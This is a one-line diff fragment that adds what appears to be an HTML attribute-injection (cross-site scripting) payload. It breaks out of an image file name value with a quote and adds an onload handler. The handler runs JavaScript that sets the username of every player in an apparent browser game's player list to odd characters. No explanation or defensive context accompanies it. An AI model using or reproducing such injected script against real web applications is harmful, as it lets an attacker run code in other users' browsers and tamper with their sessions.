@@ -1,0 +1,1 @@
+de.png"onload=(function(){game.players.forEach(function(a){a.playerInfo.userName="²³"}})();b="a
